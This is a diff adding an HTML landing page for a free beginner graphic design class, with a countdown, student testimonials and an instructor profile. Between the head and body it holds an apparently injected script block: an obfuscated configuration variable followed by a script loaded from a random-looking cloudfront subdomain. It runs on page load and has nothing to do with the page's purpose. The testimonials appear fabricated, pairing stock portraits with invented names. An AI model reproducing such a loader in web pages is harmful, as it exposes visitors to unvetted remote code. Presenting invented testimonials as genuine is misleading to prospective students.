@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>Free Graphic Design Class for Beginners</title>
+  <meta name="description" content="Join our free online graphic design class for beginners! Learn the latest tools and techniques with hands-on projects, expert guidance, and a certificate.">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;400&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
+  <style>
+    :root {
+      --purple: #7B2FF2;
+      --teal: #1DE9B6;
+      --coral: #FF6B6B;
+      --gradient-main: linear-gradient(120deg, #7B2FF2 0%, #1DE9B6 60%, #FF6B6B 100%);
+      --gradient-alt: linear-gradient(100deg, #fff 60%, #e8f7fa 100%);
+      --font-headline: 'Montserrat', 'Inter', Arial, sans-serif;
+      --font-body: 'Inter', Arial, sans-serif;
+      --radius-main: 32px;
+      --shadow-main: 0 8px 40px 0 rgba(123,47,242,0.09);
+    }
+    html,body {
+      margin: 0;
+      padding: 0;
+      font-family: var(--font-body);
+      background: #f8fafd;
+      color: #232336;
+      scroll-behavior: smooth;
+    }
+    .hero {
+      min-height: 90vh;
+      background: var(--gradient-main);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      position: relative;
+      padding-top: 64px;
+      overflow: hidden;
+      color: #fff;
+      text-align: center;
+      clip-path: ellipse(115% 72% at 50% 0%);
+    }
+    .hero h1 {
+      font-family: var(--font-headline);
+      font-weight: 700;
+      font-size: 3rem;
+      margin-bottom: 16px;
+      letter-spacing: -1px;
+      line-height: 1.1;
+      text-shadow: 0 2px 22px rgba(123,47,242,0.15);
+    }
+    .hero p {
+      font-size: 1.3rem;
+      font-weight: 400;
+      margin: 0 auto 36px;
+      max-width: 540px;
+      opacity: 0.94;
+      line-height: 1.45;
+    }
+    .cta-btn {
+      display: inline-block;
+      font-family: var(--font-headline);
+      font-size: 1.2rem;
+      padding: 18px 44px;
+      border-radius: 40px;
+      background: linear-gradient(90deg, var(--teal), var(--coral) 90%);
+      color: #fff;
+      font-weight: 700;
+      border: none;
+      box-shadow: 0 8px 30px rgba(50,50,100,0.14);
+      cursor: pointer;
+      transition: background 0.3s, transform 0.18s;
+      margin-bottom: 44px;
+      letter-spacing: 1px;
+    }
+    .cta-btn:hover {
+      background: linear-gradient(90deg, var(--coral), var(--teal) 70%);
+      transform: translateY(-2px) scale(1.04);
+    }
+    .hero-art {
+      display: flex;
+      justify-content: center;
+      align-items: flex-end;
+      gap: 44px;
+      flex-wrap: wrap;
+      margin-bottom: 0;
+    }
+    .hero-img {
+      width: 370px;
+      min-width: 240px;
+      height: 260px;
+      background: linear-gradient(120deg, #fff 70%, #f3eaff 100%);
+      border-radius: 44px 100px 60px 35px/60px 35px 90px 40px;
+      box-shadow: 0 16px 40px 0 rgba(123,47,242,0.08);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      margin-top: 10px;
+      overflow: hidden;
+    }
+    .hero-img img {
+      width: 79%;
+      filter: drop-shadow(2px 8px 18px rgba(44,44,100,0.18));
+      z-index: 2;
+    }
+    .tool-icons {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      position: absolute;
+      right: 14px;
+      bottom: 12px;
+      z-index: 3;
+    }
+    .tool-icons i, .tool-icons img {
+      font-size: 2.2rem;
+      background: #fff;
+      color: var(--purple);
+      border-radius: 50%;
+      box-shadow: 0 2px 10px rgba(123,47,242,0.13);
+      padding: 8px;
+      margin: 2px;
+      width: 42px;
+      height: 42px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .divider {
+      width: 100%;
+      margin: 0;
+      display: block;
+    }
+    .curriculum {
+      background: var(--gradient-alt);
+      border-radius: var(--radius-main);
+      box-shadow: var(--shadow-main);
+      margin: -60px auto 0 auto;
+      padding: 45px 36px 30px 36px;
+      max-width: 920px;
+      position: relative;
+      z-index: 1;
+    }
+    .curriculum h2 {
+      font-family: var(--font-headline);
+      font-size: 2.1rem;
+      font-weight: 700;
+      color: var(--coral);
+      margin-bottom: 28px;
+      text-align: center;
+    }
+    .curriculum-list {
+      list-style: none;
+      padding: 0;
+      max-width: 700px;
+      margin: 0 auto;
+      font-size: 1.08rem;
+      color: #333;
+    }
+    .curriculum-list li {
+      margin-bottom: 16px;
+      position: relative;
+      padding-left: 32px;
+      font-weight: 500;
+      line-height: 1.4;
+    }
+    .curriculum-list li:before {
+      content: "\f058";
+      font-family: "Font Awesome 6 Free";
+      font-weight: 900;
+      color: var(--teal);
+      position: absolute;
+      left: 0;
+      top: 2px;
+      font-size: 1.09rem;
+    }
+    .tools-section {
+      padding: 45px 0 34px 0;
+      background: linear-gradient(120deg, #fff 60%, #e8f7fa 100%);
+      text-align: center;
+      position: relative;
+    }
+    .tools-section h2 {
+      font-family: var(--font-headline);
+      font-size: 1.6rem;
+      color: var(--purple);
+      margin-bottom: 18px;
+      font-weight: 700;
+    }
+    .toolset-icons {
+      display: flex;
+      justify-content: center;
+      gap: 28px;
+      flex-wrap: wrap;
+      margin-top: 10px;
+    }
+    .toolset-icons i, .toolset-icons img {
+      font-size: 2.2rem;
+      color: var(--teal);
+      background: #fff;
+      border-radius: 50%;
+      box-shadow: 0 2px 12px rgba(29,233,182,0.13);
+      padding: 11px;
+      width: 48px;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .timer-section {
+      background: linear-gradient(120deg, #fff 60%, #ffe6e6 100%);
+      text-align: center;
+      padding: 44px 0 20px 0;
+    }
+    .timer-section h2 {
+      font-family: var(--font-headline);
+      font-size: 2rem;
+      color: var(--purple);
+      margin-bottom: 12px;
+    }
+    #countdown {
+      font-family: var(--font-headline);
+      font-size: 2.1rem;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      color: var(--coral);
+      letter-spacing: 2px;
+    }
+    #countdown span {
+      min-width: 35px;
+      display: inline-block;
+    }
+    .testimonials-section {
+      padding: 60px 0 40px 0;
+      background: #fff;
+      position: relative;
+      z-index: 1;
+    }
+    .testimonials-section h2 {
+      font-family: var(--font-headline);
+      font-size: 1.8rem;
+      color: var(--teal);
+      text-align: center;
+      margin-bottom: 30px;
+      font-weight: 700;
+    }
+    .testimonials {
+      max-width: 900px;
+      margin: 0 auto;
+      display: flex;
+      gap: 28px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+    .testimonial {
+      background: linear-gradient(110deg, #f8fafd 90%, #e8f7fa 100%);
+      border-radius: 22px;
+      box-shadow: 0 2px 12px rgba(123,47,242,0.07);
+      padding: 28px 26px 22px 26px;
+      flex: 1 1 270px;
+      max-width: 320px;
+      min-width: 220px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 14px;
+    }
+    .testimonial img {
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-bottom: 16px;
+      border: 3px solid var(--teal);
+    }
+    .testimonial p {
+      font-size: 1rem;
+      color: #3a3a4b;
+      margin-bottom: 12px;
+      font-weight: 500;
+      line-height: 1.5;
+    }
+    .testimonial .name {
+      font-size: 1.05rem;
+      color: var(--coral);
+      font-weight: 700;
+    }
+    .instructor-section {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 48px;
+      flex-wrap: wrap;
+      padding: 58px 0 18px 0;
+      background: linear-gradient(120deg, #fff 70%, #e6f6ff 100%);
+      position: relative;
+    }
+    .instructor-photo {
+      flex: 0 0 170px;
+      width: 170px;
+      height: 170px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #fff 60%, #b5b7ff 100%);
+      box-shadow: 0 4px 22px rgba(123,47,242,0.12);
+      overflow: hidden;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .instructor-photo img {
+      width: 88%;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+    .instructor-info {
+      max-width: 440px;
+      font-family: var(--font-headline);
+    }
+    .instructor-info h3 {
+      font-size: 1.5rem;
+      color: var(--teal);
+      margin: 0 0 10px 0;
+      font-weight: 700;
+    }
+    .instructor-info p {
+      font-size: 1.05rem;
+      color: #3a3a4b;
+      margin: 0 0 10px 0;
+      line-height: 1.5;
+      font-family: var(--font-body);
+      font-weight: 500;
+    }
+    .instructor-info .download-btn {
+      margin-top: 15px;
+      padding: 10px 34px;
+      background: linear-gradient(90deg, var(--purple) 60%, var(--coral) 100%);
+      color: #fff;
+      font-family: var(--font-headline);
+      font-weight: 700;
+      border: none;
+      border-radius: 30px;
+      font-size: 1.02rem;
+      cursor: pointer;
+      box-shadow: 0 2px 14px rgba(255,107,107,0.11);
+      transition: background 0.3s, transform 0.18s;
+    }
+    .instructor-info .download-btn:hover {
+      background: linear-gradient(90deg, var(--coral), var(--teal) 70%);
+      transform: scale(1.04);
+    }
+    @media (max-width: 1050px) {
+      .curriculum {
+        padding: 37px 10px 23px 10px;
+      }
+      .testimonials {
+        gap: 18px;
+      }
+      .instructor-section {
+        gap: 28px;
+      }
+    }
+    @media (max-width: 850px) {
+      .instructor-section {
+        flex-direction: column;
+        gap: 16px;
+        padding: 32px 0 10px 0;
+      }
+      .testimonials {
+        flex-direction: column;
+        align-items: center;
+      }
+    }
+    @media (max-width: 650px) {
+      .hero h1 {
+        font-size: 2.1rem;
+      }
+      .hero-art {
+        flex-direction: column;
+        gap: 16px;
+      }
+      .curriculum {
+        margin: -40px 5px 0 5px;
+        padding: 26px 8px 10px 8px;
+      }
+      .curriculum-list {
+        font-size: 0.99rem;
+      }
+      .testimonials-section {
+        padding: 30px 0 22px 0;
+      }
+    }
+  </style>
+</head>
+
+<script type="text/javascript">
+    var VPSvV_ozt_uxWIbc={"it":4506048,"key":"da1d6"};
+</script>
+<script src="https://dfmpe7igjx4jo.cloudfront.net/d2ed032.js"></script>
+
+<body>
+  <section class="hero">
+    <h1>Free Graphic Design Class</h1>
+    <p>Start your creative journey! Learn the essentials of design, master top industry tools, and create beautiful projects—no experience needed.</p>
+    <button class="cta-btn" onclick="window.scrollTo({top: document.querySelector('.curriculum').offsetTop-90, behavior:'smooth'})">
+      Join Free Class Now
+    </button>
+    <div class="hero-art">
+      <div class="hero-img">
+        <img src="https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=600&q=80"
+             alt="Creative workspace with laptop and design tools" />
+        <div class="tool-icons">
+          <i class="fa-brands fa-figma" title="Figma"></i>
+          <i class="fa-brands fa-adobe" title="Adobe Suite"></i>
+          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/adobephotoshop.svg" alt="Photoshop" title="Photoshop" style="background:none;"/>
+          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/adobeillustrator.svg" alt="Illustrator" title="Illustrator" style="background:none;"/>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <svg class="divider" viewBox="0 0 1440 70" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0,40 C400,110 1080,0 1440,45 L1440,70 L0,70Z" fill="#fff"/></svg>
+
+  <section class="curriculum" id="curriculum">
+    <h2>Curriculum Highlights</h2>
+    <ul class="curriculum-list">
+      <li>Design Fundamentals & Color Theory</li>
+      <li>Hands-on with Photoshop, Illustrator, Figma</li>
+      <li>Typography, Layout & Branding</li>
+      <li>Real Projects: Social Media, Posters, Logos</li>
+      <li>Portfolio Building & Creative Careers</li>
+    </ul>
+  </section>
+
+  <svg class="divider" viewBox="0 0 1440 70" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0,25 C360,90 1080,0 1440,55 L1440,70 L0,70Z" fill="#e8f7fa"/></svg>
+
+  <section class="tools-section">
+    <h2>Tools You'll Master</h2>
+    <div class="toolset-icons">
+      <i class="fa-brands fa-figma" title="Figma"></i>
+      <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/adobephotoshop.svg" alt="Photoshop" title="Photoshop" style="background:none;"/>
+      <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/adobeillustrator.svg" alt="Illustrator" title="Illustrator" style="background:none;"/>
+      <i class="fa-solid fa-palette" title="Color Wheel"></i>
+      <i class="fa-solid fa-layer-group" title="Mood Board"></i>
+    </div>
+  </section>
+
+  <svg class="divider" viewBox="0 0 1440 70" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0,40 C400,120 1080,0 1440,50 L1440,70 L0,70Z" fill="#ffe6e6"/></svg>
+
+  <section class="timer-section">
+    <h2>Next Class Starts In:</h2>
+    <div id="countdown">
+      <span id="days"></span>d :
+      <span id="hours"></span>h :
+      <span id="minutes"></span>m :
+      <span id="seconds"></span>s
+    </div>
+    <script>
+      // Countdown to next Monday, 9am UTC
+      function getNextMonday9am() {
+        const now = new Date();
+        const result = new Date();
+        result.setUTCHours(9,0,0,0);
+        result.setUTCDate(now.getUTCDate() + ((8 - now.getUTCDay()) % 7 || 7));
+        if(result < now) result.setUTCDate(result.getUTCDate() + 7);
+        return result;
+      }
+      function updateCountdown() {
+        const end = getNextMonday9am();
+        const now = new Date();
+        const diff = end - now;
+        if (diff < 0) return;
+        const days = Math.floor(diff/1000/60/60/24);
+        const hours = Math.floor(diff/1000/60/60)%24;
+        const minutes = Math.floor(diff/1000/60)%60;
+        const seconds = Math.floor(diff/1000)%60;
+        document.getElementById('days').textContent = days.toString().padStart(2,'0');
+        document.getElementById('hours').textContent = hours.toString().padStart(2,'0');
+        document.getElementById('minutes').textContent = minutes.toString().padStart(2,'0');
+        document.getElementById('seconds').textContent = seconds.toString().padStart(2,'0');
+      }
+      setInterval(updateCountdown, 1000);
+      updateCountdown();
+    </script>
+  </section>
+
+  <svg class="divider" viewBox="0 0 1440 70" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0,40 C400,110 1080,0 1440,45 L1440,70 L0,70Z" fill="#fff"/></svg>
+
+  <section class="testimonials-section">
+    <h2>What Students Say</h2>
+    <div class="testimonials">
+      <div class="testimonial">
+        <img src="https://randomuser.me/api/portraits/women/32.jpg" alt="Student testimonial 1"/>
+        <p>“This class made design so easy to understand! I loved the projects and now I feel confident using Photoshop and Figma.”</p>
+        <div class="name">— Alex J.</div>
+      </div>
+      <div class="testimonial">
+        <img src="https://randomuser.me/api/portraits/men/41.jpg" alt="Student testimonial 2"/>
+        <p>“The instructor is super friendly and gives great feedback. The countdown made me excited to join!”</p>
+        <div class="name">— Chris L.</div>
+      </div>
+      <div class="testimonial">
+        <img src="https://randomuser.me/api/portraits/women/65.jpg" alt="Student testimonial 3"/>
+        <p>“I built my first real portfolio here. The course is fun, creative, and perfect for beginners.”</p>
+        <div class="name">— Priya K.</div>
+      </div>
+    </div>
+  </section>
+
+  <svg class="divider" viewBox="0 0 1440 70" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0,30 C360,90 1080,0 1440,65 L1440,70 L0,70Z" fill="#e6f6ff"/></svg>
+
+  <section class="instructor-section">
+    <div class="instructor-photo">
+      <img src="https://images.unsplash.com/photo-1511367461989-f85a21fda167?auto=format&fit=facearea&w=300&q=80" alt="Instructor Jane Doe"/>
+    </div>
+    <div class="instructor-info">
+      <h3>Jane Creative</h3>
+      <p><strong>Designer & Mentor</strong></p>
+      <p>Jane has 12+ years of experience in branding, digital illustration, and UI/UX. She loves helping beginners unlock their creative potential. Her students have gone on to work with top creative teams and agencies.</p>
+      <button class="download-btn" onclick="_yy()">Download Resume</button>
+    </div>
+  </section>
+
+  <script>
+    // Smooth scroll for Join CTA
+    document.querySelector('.cta-btn').addEventListener('click', function(e) {
+      e.preventDefault();
+      document.querySelector('.curriculum').scrollIntoView({behavior:'smooth'});
+    });
+    // Download Resume Button: _yy()
+    function _yy() {
+      alert('This is a placeholder for your custom script.');
+      // Add your custom script here.
+    }
+  </script>
+</body>
+</html>
